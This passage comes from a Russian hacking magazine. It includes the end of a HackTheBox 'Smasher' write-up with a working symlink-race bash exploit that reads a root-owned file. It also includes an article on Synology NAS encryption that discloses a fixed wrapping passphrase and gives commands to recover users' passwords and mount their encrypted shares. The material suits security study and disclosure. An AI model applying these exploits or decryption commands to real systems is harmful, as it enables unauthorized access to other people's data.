  В последнем релизе  Cutter — графическая оболочка легендарного
Radare2 — обзавелся гидровским модулем для декомпиляции прямо «из
коробки» (раньше его нужно было ставить отдельно). Если тебе по какой‐то
причине не нравится Ghidra в целом, но при этом ты хочешь смотреть код
на C, то Cutter — твой выбор.
  В главном окне программы появилась вкладка Decompiler — она как раз
отвечает за вывод информации от плагина r2ghidra‐dec.





                    Плагин r2ghidra‐dec в Cutter

Ну и конечно, здесь есть привычное графовое представление.





               Графовое представление checker в Cutter

Вот что у меня получилось после небольших кос метических правок псев‐
докода функции main.


// checker‐main.c


int main(int argc, char **argv) {
    if (getuid() == 0x3e9) {
        puts("[+] Welcome to file UID checker 0.1 by dzonerzy\n");


        if (argc < 2) {
            puts("Missing arguments");
        }


        else {
            filename = argv[1];
            buf_stat = malloc(0x90);


            if (stat(filename, buf_stat) == 0) {
                if (access(filename, 4) == 0) {
                    char file_contents[520];


                    setuid(0);
                    setgid(0);
                    sleep(1);
                    strcpy(file_contents, ReadFile(arg1));
                    printf("File UID: %d\n", (uint64_t)*(uint32_t *)(
(int64_t)buf_stat + 0x1c));
                    printf("\nData:\n%s", (int64_t)&file_contents + 4
);
                } else {
                    puts("Acess failed , you don\'t have permission!"
);
                }
            } else {
                puts("File does not exist!");
            }
        }
        rax = 0;
    } else {
        sym.imp.puts("You\'re not \'smasher\' user please level up
bro!");
        rax = 0xffffffff;
    }
    return rax;
}

Отсюда можно получить почти полное представление о том, как работает
checker:
 1. Проверка настоящего user ID (функция getuid). Если он равен 1001 (или
  0x3e9 в шестнадцатеричном виде), то выполнение продол жается, ина‐
   че — вывод сооб щения о необходимости левел‐апа и завершение
   работы.
 2. Проверка количества переданных аргу ментов. Если их больше одного, то
   выполнение продол жается, ина че — вывод сооб щения о нехватке аргу‐
  ментов и завершение работы.
 3. Проверка существования файла, переданного в первом аргументе. Если
   он существует, то выполнение про дол жается, ина че — вывод сообщения
  об отсутствии такого файла и завершение работы.
 4. Проверка доступа к чтению файла у владель ца процесса. Если поль‐
   зователь, запустивший checker, может читать файл, то выполнение про‐
   должается, иначе — вывод сооб щения о нехватке привиле гий и завер‐
  шение работы.

Когда все провер ки пройдены:
 • в стеке создается буфер file_contents раз мером 520 байт;
 • вызываются функции setuid и setgid (они обеспечивают чте ние файла,
   к которому у нас есть изна чальный дос туп, от имени root);
 • в буфер file_contents с помощью не безо пасной функции strcpy
   копируется результат работы сторонней функции ReadFile;
 • уход в сон на одну секунду (та самая задержка, которую я сперва принял
   за «зависание» программы);
 • вывод сообщений, содержащих UID владельца файла и внутреннос ти того
   самого файла.

Какие выводы можно сделать из проведенного ана лиза?
   Во‐первых, в этом файле тоже есть уязвимость перепол нения сте ка, ведь
в коде используется strcpy — а она копиру ет содержимое файла в статичес‐
кий буфер на стек. Вот, кстати, как выглядит сама функция чтения содер‐
жимого файла ReadFile.


// checker‐ReadFile.c


int64_t sym.ReadFile(char *arg1)
{
    int32_t iVar1;
    int32_t iVar2;
    int64_t iVar3;
    int64_t ptr;


    ptr = 0;
    iVar3 = sym.imp.fopen(arg1, 0x400c68);
    if (iVar3 != 0) {
        sym.imp.fseek(iVar3, 0, 2);
        iVar1 = sym.imp.ftell(iVar3);
        sym.imp.rewind(iVar3);
        ptr = sym.imp.malloc((int64_t)(iVar1 + 1));
        iVar2 = sym.imp.fread(ptr, 1, (int64_t)iVar1, iVar3);
        *(undefined *)(ptr + iVar1) = 0;
        if (iVar1 != iVar2) {
            sym.imp.free(ptr);
            ptr = 0;
        }
        sym.imp.fclose(iVar3);
    }
    return ptr;
}

Здесь все совсем просто: открывается файл, выделяется нужный объем
памяти, чтобы содержимое вместилось целиком, далее чтение данных и воз‐
вращение указателя на область, куда было загружено содержимое файла.
   Во‐вторых, у нас есть возможность про вести атаку по вре мени. Между
проверкой доступа к ука занному файлу (if (access(filename, 4) == 0))
и самим чтением содержимого есть окно в одну секунду. Это значит, что мы
можем успеть подменить файл любым дру гим (даже тем, к которому у нас нет
доступа) — и он все равно будет прочитан, ведь к этому моменту checker уже
получил SUID‐бит (setuid(0); setgid(0)).
  Реализуем эту атаку для чтения root‐флага, но сначала узнаем, получится
ли сорвать стек при выполнении strcpy.


strace
Откровенно говоря, такой ана лиз можно провес ти, имея дос туп все го к одной
утилите — strace. Это стандартный инс трумент для отслеживания системных
вызовов процесса в Linux. Я приведу его вывод, оставив только значимую
для нас информацию.


 root@kali:~# strace ./checker checker
 execve("./checker", ["./checker", "checker"], 0x7fff857edf88 /* 47
 vars */) = 0
 ...
 getuid()                                = 0
 ...
 write(1, "[+] Welcome to file UID checker "..., 48[+] Welcome to
 file UID checker 0.1 by dzonerzy
 ...
 stat("checker", {st_mode=S_IFREG|0750, st_size=13617, ...}) = 0
 access("checker", R_OK)                 = 0
 setuid(0)                               = 0
 setgid(0)                               = 0
 nanosleep({tv_sec=1, tv_nsec=0}, 0x7fff72ad99c0) = 0
 openat(AT_FDCWD, "checker", O_RDONLY)   = 3
 ...
 lseek(3, 12288, SEEK_SET)               = 12288
 read(3, "\240\5@\0\0\0\0\0\240\5\0\0\0\0\0\0\260\1\0\0\0\0\0\0\5\0\
 0\0\30\0\0\0"..., 1329) = 1329
 lseek(3, 0, SEEK_SET)                   = 0
 read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\2\0>\0\1\0\0\0\260\10@\0\0\
 0\0\0"..., 12288) = 12288
 read(3, "\240\5@\0\0\0\0\0\240\5\0\0\0\0\0\0\260\1\0\0\0\0\0\0\5\0\
 0\0\30\0\0\0"..., 4096) = 1329
 close(3)                                = 0
 write(1, "File UID: 0\n", 12File UID: 0
 ...
 write(1, "\nData:\n", 7
 ...
 write(1, "\177ELF\2\1\1", 7ELF)            = 7
 exit_group(0)                           = ?
 <span class=nobr>+ exited with 0 </span>+


Как можно  видеть,  результат почти полностью отражает  ту  текстовую
блок‐схему, которую мы набросали пос ле анализа в Cutter.



Об ход ограниче ния UID на запуск
Так как успешно работать с программой может только пользователь с UID
1001, у нас не получится просто так запустить его на своей машине. Чтобы
открыть checker в дебаггере, нужно обойти это ограниче ние. На ум приходят
сразу несколько способов.
  Первый вариант — соз дать пользователя smasher с нужным порядковым
номером на Kali.



  root@kali:~# useradd ‐u 1001 ‐m smasher
  root@kali:~# smasher su smasher

 python ‐c 'import pty;
 pty.spawn("/bin/bash")'




  smasher@kali:/root/htb/boxes/smasher$ whoami
 smasher

После этого я смо гу запустить checker.



  smasher@kali:/root/htb/boxes/smasher$ ./checker
  [+] Welcome to file UID checker 0.1 by dzonerzy


  Missing arguments


Второй вариант — пропатчить бинарь. Для этого найдем машинное пред‐
ставление инструкции, которая отвечает за проверку UID (по расположению
числа 0x3e9).



  root@kali:~# objdump ‐D checker | grep ‐A1 ‐B1 0x3e9
  400a93:       e8 38 fd ff ff          callq  4007d0 <getuid@plt>
  400a98:       3d e9 03 00 00          cmp    $0x3e9,%eax
  400a9d:       74 14                   je     400ab3 <main+0x38>


Заменим 0x3e9 на 0x0, чтобы запускать checker от имени root. Это можно
сделать как консольными утилитами (тем же всемогущим vi), так и графичес‐
кими (например, ghex). Я остановлюсь на первом способе.



  root@kali:~# vim checker
  (vim) :% !xxd
  (vim) /3de9
  (vim) Enter + i
  3de9030000 => 9083F80090
  (vim) Escape
  (vim) :w
  (vim) :% !xxd ‐r
  (vim) :wq
  root@kali:~# ./checker checker
  ...





                     Патчим checker с помощью vi

Я заменил машинный код 3d e9 03 00 00, отвечающий за инструкцию cmp
eax,0x3e9, на 90 83 F8 00 90 — что экви валентно cmp eax,0x0 с добиты ми
до оригинальной длины инструкциями NOP  (0x90). Ассемблировать мне‐
моники в опкод (и наоборот) можно с помощью Ropper или он лайн.


Воз можен ли срыв сте ка?
Откроем checker в GDB PEDA и поп робуем перезаписать RIP. Для этого я
сгенерю паттерн длиной 1000 байт, сохраню в файл p.txt и подам его
на вход чекеру.



  gdb‐peda$ pattern create 1000 p.txt
  Writing pattern of 1000 chars to filename "p.txt"
  gdb‐peda$ r p.txt
  ...


Программа ожидаемо упа ла. Пос мотрим содержимое регистра RSP.



  gdb‐peda$ x/xg $rsp
  0x7fffffffde40: 0x00007fffffffe158


В RSP содержится указатель. Если пойти дальше и взгля нуть на содержимое
указателя, мы найдем часть нашей циклической последовательнос ти.



  gdb‐peda$ x/xs 0x00007fffffffe158
  0x7fffffffe158: "BWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$‐A$(
  A$DA$;A$)
  A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7
  A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$t"...
  gdb‐peda$ pattern offset BWABuABXABv
  BWABuABXABv found at offset: 776


Из‐за того, что в RSP сохраняется не само содержимое файла, а указатель
на него, у меня не вышло получить контроль над RIP. Не уверен, воз можно ли
это в принципе, так что пойдем по пути наименьшего сопротивления и перек‐
лючимся на атаку по времени.


Гон ка за root.txt
Стратегия проста до безобразия:
 • создаем фейковый файл, который мы заведомо можем читать;
 • создаем сим волическую ссылку, ука зывающую на него;
 • асинхронно (в фор ке процес са основного шелла) скармливаем файл
   чекеру;
 • ждем полсекунды, что бы попасть на секунду «ожидания»;
 • подменяем символическую ссылку на любой дру гой файл (только не слиш‐
   ком большой, чтобы не сло вить ошибку сег ментации).


#!/bin/bash


# Использование: bash checker‐exploit.sh <ФАЙЛ>


# Создаем пустой файл, который будет нашим «прикрытием»
touch .fake


# Создаем связующее звено — символическую ссылку на .fake, которую
мы подменим далее
ln ‐s .fake .pivot


# На фоне запускаем чекер и ждем полсекунды, чтобы попасть в окно
секундной задержки
checker .pivot &
sleep 0.5


# Подменяем символическую ссылку на другой файл, переданный скрипту
в первом аргументе
ln ‐sf $1 .pivot


# Ждем еще полсекунды и чистим следы
sleep 0.5
rm .fake .pivot



  smasher@smasher:~$ ./checker‐exploit.sh /root/root.txt
  [+] Welcome to file UID checker 0.1 by dzonerzy


  File UID: 1001


  Data:
  077af136????????????????????????


Вот и все: Сокрушитель повержен, root‐флаг у нас!





                             Трофей


ЭПИЛОГ
Анализ tiny.c с помощью PVS-Studio
Когда я нашел уязвимость в исходнике tiny.c, мне пришла в голову странная
мысль: посмотреть, что ска жет о качес тве кода и воз можных проблемах с ним
статический анализатор. Рань ше мне доводилось работать только с PVS‐Stu‐
dio от отечествен ных разработчиков — с его помощью я и решил удовлетво‐
рить свое любопытство. Не до конца уверен, что именно я ожидал увидеть
в отчете, ведь переполнение стека здесь носит неочевидный характер.
«Небезопасные» функции напрямую в нем не винова ты — и странно ожидать,
что анализатор найдет опас ность в вызове или реализации функции url_de‐
code. Но мне все же было интересно.
  Я загрузил и установил PVS‐Studio на Kali.



  root@kali:~# wget ‐q ‐O ‐ https://files.viva64.com/etc/pubkey.txt | sudo
  apt‐key add ‐
  root@kali:~# sudo wget ‐O /etc/apt/sources.list.d/viva64.list
  https://files.viva64.com/etc/viva64.list
  root@kali:~# sudo apt update
  root@kali:~# sudo apt install pvs‐studio ‐y


Потом добавил две строки в начало исходно го кода tiny.c, как показано
на официальном сайте прог раммы, — для активации академичес кой лицен‐
зии.


// This is a personal academic project. Dear PVS‐Studio, please
check it.
// PVS‐Studio Static Code Analyzer for C, C++, C#, and Java: http://
www.viva64.com

Я все еще студент, поэто му чист перед своей совестью и законом.
  Далее я закомментировал еще две строки в tiny.c — чтобы GCC
не жаловался, что он не знает о сущес твовании директивы SO_REUSEPORT
(проблемы переносимости).


// if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEPORT, (const char*)&
reuse, sizeof(reuse)) < 0)
//  perror("setsockopt(SO_REUSEPORT) failed");

Теперь я могу соб рать про ект при помощи make через трассировку PVS‐Stu‐
dio (кстати, здесь неявно используется уже зна комый нам strace).



  pvs‐studio‐analyzer trace ‐‐ make


Команда создала файл strace_out — он содержит результаты трас сировки
и будет использован на следующем этапе. Анализируем процесс сборки
с помощью analyze, ука зав имя выходного файла через флаг ‐o.



  pvs‐studio‐analyzer analyze ‐o project.log
  Using tracing file: strace_out
  [100%] Analyzing: tiny.c
  Analysis finished in 0:00:00.28
  The results are saved to /root/htb/boxes/smasher/pvs‐tiny/project.log


И наконец, попросим статичес кий анализа тор сгенерировать расширенный
финальный отчет в фор мате HTML.



  plog‐converter ‐a GA:1,2 ‐t fullhtml project.log ‐o .
  Analyzer log conversion tool.
  Copyright (c) 2008‐2019 OOO "Program Verification Systems"


  PVS‐Studio is a static code analyzer and SAST (static application secu‐
  rity
  testing) tool that is available for C and C++ desktop and embedded de‐
  velopment,
  C# and Java under Windows, Linux and macOS.


  Total messages: 16
  Filtered messages: 13


Теперь я могу открыть fullhtml/index.html, чтобы ознакомиться с отчетом.





                       От чет PVS‐Studio

Большинство переживаний ана лизатора свя заны с теоретическими перепол‐
нениями при исполь зовании функций sscanf и sprintf — в нашем случае их
можно отнести к ложноположительным срабаты вани ям. Однако ни на что дру‐
гое PVS‐Studio в реализации parse_request не пожаловался.





            Анализ функции parse_request (tiny.c) в PVS‐Studio

О чем это говорит? О том, что верификация кода все еще трудно под дается
автоматизации — даже при современных технологиях.
ВЗЛОМ
 ДЫРЯВЫЕ
     ДИСКИ





                                                                             Олег Афонин
                                                                                     Эксперт по мобильной
                                                                                   криминалистике компании
                                                                                        «Элкомсофт»
                                                                                             aoleg@voicecallcentral.com



                     ЭКСПЛУАТИРУЕМ
                      УЯЗВИМОСТИ
                        В СЕТЕВЫХ
                      ХРАНИЛИЩАХ
                         SYNOLOGY




Защита  данных,  приватность  и  соответствие  нормам
безопасного хранения информации — то, над чем работают
прак тичес ки все производители средств хранения информа‐
ции. И если в корпоратив ном сегменте все более‐менее
хорошо, то рекламным лозун гам «безопасное шифрование
AES‐256» в накопителях, нацеленных на домашний сегмент,
безусловно верить не стоит.


Эта статья открывает новую большую тему: шифрование данных на внешних
дисках и сетевых хранилищах. Откро венно наплевательские реализации
защиты, дырявые схемы хра нения клю чей, генераторы случайных чисел,
выдающие один из 255 прошитых в систему вариантов, — это самое малое
из того, с чем нам довелось столкнуться во время исследования. Начнем
с самой, пожалуй, популярной марки сетевых хра нилищ — моделей компании
Synology.


ШИФРОВАНИЕ В СЕТЕВЫХ НАКОПИТЕЛЯХ (NAS)
Конкуренция среди произво дителей сетевых хра нилищ для домашних поль‐
зователей и офисов огромна. Здесь и модели Western Digital, привлекающие
нулевой или отрицательной ценой (NAS со встро енным диском стоит дешев‐
ле такого же диска отдельно), и признанные гранды QNAP и Synology,
которые берут мощной программной частью и длительной поддержкой,
и выступающие с переменным успехом Asustor и Drobo, и даже экзотичес кие
для нас Terra Master и Thecus. В большинс тве моделей этих производителей
предусмотрено шифрование, поз воляющее защитить пользовательские дан‐
ные.


ШИФРОВАНИЕ В SYNOLOGY
Все без исключения сетевые накопители Synology используют один и тот же
алгоритм шифрования AES с длиной ключа 256 бит. Выбор этого алгоритма
шифрования вполне логичен: большинс тво современных наборов микросхем
поддерживает аппаратное уско рение AES или хотя бы набор инс трукций,
использующихся именно в этом алго ритме. Тем не менее реальная безопас‐
ность зашифрованных  таким  обра зом  данных  разительно  отличается
в зависимости от реализации.
   Практически во всех NAS, в которых вообще есть возможность зашиф‐
ровать данные, использует ся либо защита всего накопителя целиком (аппа‐
ратное шифрование SED — Self‐Encrypting Disk — на уровне контроллера
SATA), либо шифрование тома, расположенного как на одном диске, так и на
массиве RAID. В части моделей (нап ример, QNAP) можно активировать оба
способа — и это позволя ет избежать некоторых очевидных атак.
  В моделях Synology, предназначенных для серверных стоек, также можно
активировать аппаратное шифрование SED. Одна ко большинс тво домашних
и офисных моделей такой возможности лишены. Вмес то этого Synology пред‐
лагает использовать шифрование файлов на уровне отдельных сетевых
папок.
  Шифрование реализовано средства ми стандартной для Linux файловой
системы eCryptFS, о которой можно почитать, например, здесь или здесь.
В сравнении с методами шифрования, основанными на защите целых томов,
у такого пофайлового шифрования есть и дос тоинс тва, и недос татки.
  В достоинства мы запишем следующее:
 1. Поскольку шифруются отдельные сетевые пап ки, не име ет абсолютно
   никакого значения, на каком из внутренних физических или логичес ких
   накопителей они расположены.
 2. Каждый пользователь может зашифровать свою папку своим собс твенным
   паролем. Таким образом обеспечива ется защита между отдельными
   пользователями.
 3. Стандартная реализация шифрования поз воляет просто скопировать
  зашифрованную папку, к примеру на дру гой накопитель, — и данные оста‐
   нутся надежно зашифрованными. При этом смонтировать и расшифровать
   такую папку легко получится стандартными же средствами на любом
   компьютере с Linux.
 4. Шифруются как сами данные, так и имена папок и файлов.

Если у пофайлового шифрования столько дос тоинств, почему все остальные
производители предпочитают шифровать целые тома? К сожалению, недос‐
татки eCryptFS способ ны серьезно ограничить шифрование или даже сделать
его невозможным.
  Основное и самое неприятное огра ничение eCryptFS — на длину имен
файлов. В имени файла в зашифрованной папке не может быть боль‐
ше 143 символов ANSI или 47 символов иероглифической записи.





Следующее ограничение напрямую каса ется безопасности зашифрованных
данных, и оно более чем серьезно. В рамках реализации eCryptFS раз работ‐
чики Synology не предусмотрели такой простой вещи, как разделение ключей
шифрования дан ных MEK (Media Encryption Key) и ключей шифрования ключа
KEK (Key Encryption Key). В результате тот пароль, который пользователь
задает при создании зашифрованной папки, и служит тем самым ключом
шифрования данных — MEK. Не говоря даже о том, что энтропия заданного
домашним пользователем или офисным работником пароля, как правило,
существенно меньше 256  бит,  что позволяет создать очень быс трую
и эффективную атаку.
  Кроме того, в этой реализации пользователь не может сменить ключ шиф‐
рования без полной перешифровки сессионных клю чей всех до единого фай‐
лов. Перешифровка же типичной сетевой папки с нес колькими десятками
тысяч файлов может занять несколько часов (в зависимости от модели
устройства и ско рости диска), так что, можно сказать, изменение ключа шиф‐
рования нерационально.
   Хорошо, об ограничениях поговорили. А что нас чет уяз вимостей? Они
есть, и их больше одной. Но прежде чем говорить об уязвимостях, рассмот‐
рим механизм управле ния клю чами, реализованный в Synology.


УПРАВЛЕНИЕ КЛЮЧАМИ ШИФРОВАНИЯ В SYNOLOGY DSM
Все сетевые хранилища Synology работа ют под управлением операционной
системы Disk Station Manager (DSM), практически все модели компании (по
крайней мере, те из них, которые были выпущены в последние пять‐шесть
лет) — под управле нием унифицированной сборки. Обновления выходят
практически одновремен но для всех моделей. На сегодня актуальны сборки
DSM 6.2.
  Для управле ния ключами в DSM 6.2 используется утилита Key Manager,
основная задача которой — сохранить ключи и обеспечить воз можность
автоматического  монтирования зашифрованных  томов  после  загрузки
устройства.
  После создания зашифрованной сетевой пап ки ключ (файл с рас ширени‐
ем .key, представляющий собой пароль в «обертке», — практичес ки обфуска‐
ция) автоматически сохраняется на компьютер поль зователя. Этот ключ мож‐
но сохранить (например, в зашифрованном архиве), а можно удалить — если
пользователь уверен, что никогда не забудет пароль шифрования.
  А вот дальше есть варианты. Пользователь может выбрать один из трех
способов управле ния ключами.
 1. Полностью ручное управление. На устройстве Synology пароль не сох‐
   раняется (помним при этом, что файл с ключом был автоматичес ки сох‐
   ранен на компьютер поль зователя). При включении NAS или перезагрузке
  DSM зашифрованные тома автоматически размонтируются. Для их мон‐
   тирования нужно зайти в администра торский веб‐интерфейс, открыть раз‐
   дел сетевых папок и вручную смонтировать все нужные зашиф рованные
   папки.  Для  продвинутых  пользователей  существует  неофи циальный
   и недокументированный вариант с уда лен ным монтированием через SSH,
   но, полагаю, большинству домашних и офисных пользовате лей об этом
   неизвестно.
 2. Двоичный ключ шифрования (machine key в терминах DSM) сохраня ется
   на устройстве Synology. Зачем это может понадобиться пользовате лю?
  Да просто чтобы избежать описанных в первом пункте шагов для мон‐
   тирования зашифрован ного тома! Дос таточно пос тавить галочку в пункте
   mount on boot, и DSM автоматически подмонтирует зашифрованную папку
   при загрузке. Профит! О безопас ности, правда, можно забыть: если
   и ключ шифрования, и сами данные хранятся на одном и том же устрой‐
   стве, то расшифровка тривиальна.





 3. Наконец, реверанс в сторону безопас ности: ключ шифрования сохраня‐
   ется не на самом устройстве, а на внешнем USB‐накопителе. Более того,
   ключ шифрования MEK, сохраненный на внешнем USB‐накопителе, можно
  зашифровать своим собственным паролем (KEK) — и это важный момент.
  Тем не менее и для ключей шифрования, сохраненных на USB‐накопителе,
   опция mount on boot по‐прежнему доступна. Значит, при ее активации
   пароль шифрования ключа (KEK), введенный пользователем, сохраняется
   на устройстве Synology. Отметим и этот момент.

Что произойдет, если вста вить USB‐накопитель с клю чом уже пос ле загрузки,
когда зашифрованная пап ка не смонтирована? Автоматически не смонтиру‐
ется, будет предложен выбор из трех вари антов аутентификации.





Как DSM получает двоичный ключ шифрования для алгоритма AES из пароля
пользователя? Можно было бы ожидать, что пароль шифрования, указанный
пользователем, «заворачивается» очередным клю чом wrapping key, а он игра‐
ет роль ключа KEK, который должен защитить ключ шифрования данных MEK.
  На самом же деле в DSM (уточню: в тех версиях DSM, которые работают
на потребительских моделях Synology, предназна ченных для дома и офиса)
не используется ничего подобного. Данные шифруются паролем, который
устанавливает пользователь. А вот сам пароль шифруется одной‐единствен‐
ной фразой — аналогом печально извес тного default_password, исполь‐
зующегося при шифровании по методу FDE в Android.
   Что это нам дает? Во‐пер вых, если пароль шифрования сетевой папки нам
известен, расшифровать ее содержимое мы можем на абсолютно любом
компьютере с Linux, прос то вытащив диск из сетевого накопителя. Слож‐
ности, связанные с монтированием RAID‐массива, мы оставим в стороне —
в конце концов, такие программы существуют даже для Windows.
   Во‐вторых, если поль зователь сохранил ключ во встроенной утилите Key
Manager (а это делают гораздо чаще, чем ты думаешь, ведь монтирование
зашифрованных папок в DSM — занятие небыстрое и не самое удобное), то
такой сохраненный ключ тоже шифруется все тем же wrapping key — теперь
мы можем не только рас шифровать данные, но и увидеть сам пароль,
который вводил пользователь!
   Если ключ шифрования сохраняется на встроенном накопителе, пароль
wrapping passphrase сменить нельзя. Этот пароль один и тот же на всех
накопителях Synology.
   Что получается в результате? При использовании встроенной в DSM ути‐
литы Key Manager уровень защиты данных строго равен нулю: и сами данные,
и ключ шифрования MEK хранятся на жес тком дис ке, а ключ KEK фиксирован‐
ный и нам известен. Извлекаем диск, читаем или расшифровываем данные,
заодно узнаем оригиналь ный пароль, который ввел пользователь.


Как делать пра виль но
Для лучшего понимания всей глубины проблемы сравним механизм шиф‐
рования DSM с тем, что используют компьюте ры с Windows. Для защиты дан‐
ных в Windows исполь зуется широко известный и подробно документирован‐
ный механизм BitLocker, которым можно зашифровать системный раздел.
Ключ шифрования данных MEK сохраняется в составе контейнера; при этом
ключ MEK будет зашифрован клю чом KEK, который генерирует защищенный
модуль TPM2.0. Извлечь отту да этот ключ практически невозможно, проще
устроить лобовую атаку пароля учетной записи Windows.
   Таким образом, если мы вытащим из компьютера зашифрованный Bit‐
Locker диск, то расшифровать его не удас тся даже в том случае, когда
используется защита самого начального уровня — BitLocker Device Protec‐
tion. Для расшифровки потребуется, чтобы диск был установлен в тот самый
компьютер с тем самым аппаратным модулем TPM2.0, и понадобится пароль
от учетной записи поль зователя. Прос то TPM2.0 или просто пароля от учет‐
ной записи для расшифровки раз дела недос таточно.


Если все так плохо, то в чем вообще смысл вклю чать шифрование и исполь‐
зовать встроенный Key Manager? Причин несколько.
 1. Peace of mind. Чувство защищенности и спо кой ный сон очень важны
   для здоровья. О том, что чувство безопас ности ложное, можно никогда
   и не узнать. Пример но этой же цели (и с тем же результатом) служат теат‐
  ры безопасности, устроенные в некоторых стра нах органами охраны пра‐
   вопорядка на входе в аэропорт или на железнодорожный вокзал.
 2. Безопасная продажа или  утилиза ция работоспособного накопителя.
   Допустим, в далеком 2014 году ты приобрел NAS с дву мя гигантски ми дис‐
   ками аж по 3 Тбайт каждый. В 2019 году этот объем уже не впе чатляет, и ты
  решил заменить их на два диска по 8 Тбайт. Что делать со старыми дис‐
   ками? В первую очередь — уничтожить данные. Это можно сде лать, пол‐
   ностью переписав содержимое накопителя — зай мет несколько часов.
  Но той же цели можно добить ся проще и быстрее, просто удалив ключи
  шифрования из Key Manager. Теперь зашифрованные данные просто циф‐
   ровой шум, а диск дос таточно заново инициализировать.
 3. Наконец, ты можешь сохранить ключ не на встроенный, а на внешний USB‐
   накопитель — и вот тогда Key Manager предложит тебе ввести свой собс‐
   твенный пароль для защиты ключа. Теперь для расшифровки дисков пот‐
   ребуется USB‐накопитель с ключом шифрования, а твой пароль, которым
  защищен ключ шифрования, будет сохранен на внутреннем накопителе
   в Synology.

Итак, выполнение любого из перечисленных ниже условий делает зашиф‐
рованные данные уязвимыми.
 1. Пользователь добавляет ключ в Key Manager, сохраняя его на встроенном
   накопителе. Положение переключателя mount on boot в данном случае
   значения не имеет.





 2. Пользователь сохраня ет ключ на внеш нем USB‐накопителе, и у тебя есть
   доступ к этому накопителю.





 3. Ключ шифрования автоматичес ки сохраняется на компьютер пользовате‐
   ля при создании зашиф рованной сетевой папки. Если тебе дос тупен этот
   ключ, проблемы с рас шифровкой данных не будет. Имя файла по умол‐
   чанию — .key.





 4. Наконец, если тебе удалось узнать пароль шифрования, то рас шифровка
   данных тривиальна.


ЭКСПЛУАТАЦИЯ УЯЗВИМОСТЕЙ
Итак, подытожим описанное выше. В Synology DSM используется стандар‐
тная криптографическая файловая система eCryptFS, при этом шиф рование
SED на уровне SATA домашними и офис ными устройствами не используется.
Ключи шифрования могут сохранять ся на встроенный или внешний накопи‐
тель. В первом случае ключ шифрования защищается фиксированным
паролем; во вто ром пароль задает пользователь, но этот пароль сохраняется
на встроенном накопителе (по крайней мере, если включена опция mount
on boot).
  Уяз вимость  1: отсутс твие шифрования SED, а  также шифрования
на уровне тома позволя ет извлечь диск и изменить пароль от административ‐
ной учетной записи владельца устройства, прос то отредактировав файл /
etc/passwd.
  Уяз вимость 2: если поль зователь сохранил ключ шифрования в DSM
Key Manager, его можно извлечь и использовать для расшифровки зашиф‐
рованных данных. Кроме того, из сохраненного клю ча шифрования легко раз‐
ворачивается и оригинальный пароль, который вводил пользователь при соз‐
дании зашифрованной сетевой папки.
  Уяз вимость 3: все устрой ства Synology используют фиксированный
пароль для шифрования клю ча шифрования.
  Следующая команда отобразит оригинальный пароль, который вводил
пользователь при создании зашифрованной папки:


printf "%s" "\$1\$5YN01o9y" | ecryptfs‐unwrap‐passphrase keyfile.key
‐

Здесь $1$5YN01o9y — тот самый фиксированный ключ wrapping passphrase,
а keyﬁle.key — зашифрованный ключ шифрования данных MEK.
   Узнав пароль, можно смонтировать зашифрованную папку на любом
компьютере с  Linux. То же самое можно сделать и одной командой
при помощи файла с ключом шифрования:


mount ‐t ecryptfs ‐o key=passphrase,ecryptfs_cipher=aes,ecrypt
fs_key_bytes=32,ecryptfs_passthrough=no,ecryptfs_enable_filename
_crypto=yes,passwd=$(printf "%s" "\$1\$5YN01o9y" |
ecryptfs‐unwrap‐passphrase /path/to/keyfile.key ‐) /path/to/encryp
ted/folder /path/to/mountpoint

Пути /path/to/keyfile.key, /path/to/encrypted/folder и /path/to/
mountpoint  нужно  заменить  на фактически  используемые. Физически
зашифрованное содержимое сетевых папок DSM сохраняет в следующей
коннотации:


/Volume<N>/@<name_of_encrypted_share@

В примере выше путь будет таким:


/Volume1/@Encrypted_Share@


Статьи по теме
 • How To Recover Synology encrypted folders in Linux
 • How to decrypt ecryptfs ﬁle with private key instead of passphrase
 • Automatically mounting encrypted folders (на немецком)
 • Script: Decrypt encrypted folders via keyﬁle (.key) (на немецком)



Если пользователь сох ранил ключ на внеш нем USB‐накопителе, DSM зап‐
росит пароль для шифрования это го ключа.
   Если пользователь настроил сетевую папку таким образом, чтобы она
автоматически подключалась после загрузки устройства, то этот пароль сох‐
раняется на внутреннем накопителе. Пароль можно извлечь и использовать
для доступа к данным.
  Наконец, если поль зователь вообще не сохранил ключ шифрования в Key
Manager, то данные в относитель ной безопасности. «Относительной» потому,
что средняя энтропия пользовательских паролей значительно ниже энтро‐
пии 256‐битного клю ча шифрования AES. Ата ки на пароли именно этого типа
существуют дав но, отлично оптимизированы и работа ют чрезвычайно быс тро
(в отличие, например, от атак на ключи BitLocker или документы, созданные
в Microsoft Oﬃce 2016, — при про чих равных такие ата ки работают значитель‐
но медленнее). Никто не отменял и человечес кий фактор, который также
может использоваться для взло ма таких паролей.


ЗАКЛЮЧЕНИЕ
Данные расшифрованы, все пропало? Реальная безопасность «непробива‐
емого» шифрования в Synology оказалась ниже ожи даемой из‐за того, что
аппаратных механизмов обеспечения безопасности нет. Для обеспечения
безопасности ключей шифрования в iOS использует ся Secure Enclave, в Win‐
dows — TPM2.0, в устройствах с Android — TrustZone. В домашних и офисных
моделях Synology не используется ничего из вышеперечисленного, хотя даже
в SoC Realtek RTD1296, на которой основаны младшие модели Synology
DS118, DS218Play и DS218, поддержка ARM TrustZone есть. Роль аппаратного
модуля безопасности выполняет фиксированная фраза $1$5YN01o9y — ана‐
лог default_password в ста рых версиях Android.
  Выбор средств защиты данных всег да компромисс между удобством
и безопасностью. И если в Windows, Android и iOS мы получаем стой кую
защиту зашифрованных файлов, которую не удалось пробить даже экс плуата‐
ции уязвимости на уровне загрузчика, то у поль зовате лей Synology выбор
простой: или относительно безопас но, но неудобно (сетевые папки мон‐
тировать каждый раз вручную, через веб‐интерфейс, вводя каждый раз более
или менее стойкий пароль шифрования), или удобно, но с нулевым уровнем
безопасности. Компромиссным решением будет хранение ключа шиф‐
рования на подключаемой к устройству флешке, которую можно вставлять
во время загрузки и извлекать из накопителя после ее завершения.
ВЗЛОМ

 ОТРАВЛЕННЫЕ
 ДОКУМЕНТЫ





             КАК ИСПОЛЬЗОВАТЬ
           САМЫЕ ОПАСНЫЕ БАГИ
           В MICROSOFT OFFICE
